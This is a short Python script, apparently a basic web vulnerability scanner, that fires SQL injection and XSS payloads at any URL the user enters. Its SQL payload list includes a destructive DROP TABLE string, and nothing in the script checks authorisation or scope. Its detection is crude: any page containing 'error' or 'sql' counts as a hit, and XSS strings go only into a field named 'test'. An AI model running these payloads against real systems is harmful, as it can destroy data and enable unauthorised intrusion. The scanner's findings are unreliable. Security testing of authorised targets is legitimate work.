import requests
from bs4 import BeautifulSoup


# Function to check for SQL Injection vulnerabilities
def check_sql_injection(url, payloads):
    for payload in payloads:
        target_url = f"{url}{payload}"
        try:
            response = requests.get(target_url)
            if "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"[!] Possible SQL Injection vulnerability found with payload: {payload}")
            else:
                print(f"[-] No vulnerability found with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Request error: {e}")


# Function to check for XSS vulnerabilities
def check_xss(url, payloads):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')

            data = {}
            for input_tag in inputs:
                if input_tag.get('name'):
                    data[input_tag.get('name')] = 'test'

            for payload in payloads:
                data['test'] = payload
                if method == 'post':
                    result = requests.post(url + action, data=data)
                else:
                    result = requests.get(url + action, params=data)

                if payload in result.text:
                    print(f"[!] Possible XSS vulnerability found with payload: {payload}")
                else:
                    print(f"[-] No vulnerability found with payload: {payload}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")


# Main function to run the vulnerability scanners
if __name__ == "__main__":
    url = input("Enter the target URL (e.g., http://example.com/page): ")

    # SQL Injection payloads
    sql_payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' OR '1'='1' --"
    ]
    print("\n[+] Checking for SQL Injection vulnerabilities...")
    check_sql_injection(url, sql_payloads)

    # XSS payloads
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>"
    ]
    print("\n[+] Checking for XSS vulnerabilities...")
    check_xss(url, xss_payloads)
